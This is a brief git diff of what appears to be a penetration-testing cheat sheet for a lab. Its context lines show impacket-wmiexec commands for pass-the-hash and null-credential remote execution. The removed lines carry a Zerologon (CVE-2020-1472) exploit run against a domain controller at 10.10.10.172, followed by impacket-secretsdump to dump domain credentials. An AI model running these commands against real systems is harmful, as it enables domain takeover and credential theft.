@@ -26,9 +26,4 @@ impacket-wmiexec -hashes LMHASH:NTHASH domain/username@ip
 ```
 impacket-wmiexec domain/'':''@ip
 ```
-###### NXC Module CVE-2020-1472
-![image](https://github.com/user-attachments/assets/3d7dc036-4432-4c5b-bc94-e39c4d5a2d5d)
-```
-python3 cve-2020-1472-exploit.py Monteverde 10.10.10.172
-impacket-secretsdump 'megabank.local'/'Monteverde$'@10.10.10.172 -just-dc -no-pass 
-```
+
